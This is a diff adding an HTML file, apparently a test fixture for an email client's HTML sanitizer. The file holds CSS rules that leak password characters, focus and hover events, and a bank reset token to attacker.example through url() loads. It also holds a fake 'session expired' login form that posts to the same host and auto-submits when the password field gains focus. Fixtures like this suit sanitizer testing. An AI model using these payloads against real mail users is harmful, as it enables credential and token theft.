@@ -1,0 +1,28 @@
+<!-- SPDX-FileCopyrightText: 2026 Nebula Mail contributors -->
+<!-- SPDX-License-Identifier: AGPL-3.0-only -->
+<!doctype html>
+<html><head>
+<style>
+/* PortSwigger "CSS: the bomb inside your inbox": attribute selectors leak typed or prefilled values. */
+input[name="password"][value^="a"] { background: url(https://attacker.example/leak?c=a); }
+input[name="password"][value^="b"] { background-image: url("https://attacker.example/leak?c=b"); }
+input[type="password"]:focus { border-image: url('https://attacker.example/focus') 30 round; }
+form:has(input[value^="s"]) { list-style-image: url(https://attacker.example/has-s); }
+a[href^="https://bank.example/reset?token=a"] { cursor: url(https://attacker.example/token-a), auto; }
+label:hover { background: url(https://attacker.example/hover); }
+</style>
+</head><body>
+<p>Your session expired. Please sign in again.</p>
+<form action="https://attacker.example/login" method="post">
+  <label for="u">User</label> <input id="u" name="user" value="victim@example.com" autofocus>
+  <label>Password <input type="password" name="password" value="secret" onfocus="this.form.submit()"></label>
+  <select name="x"><option value="1">One</option></select>
+  <textarea name="note">note</textarea>
+  <datalist id="d"><option value="a"></option></datalist>
+  <output name="o">0</output>
+  <keygen name="k">
+  <input type="image" src="https://attacker.example/input-image.png">
+  <button type="submit" formaction="https://attacker.example/formaction">Sign in</button>
+</form>
+<a href="https://bank.example/reset?token=abc123">Reset link</a>
+</body></html>
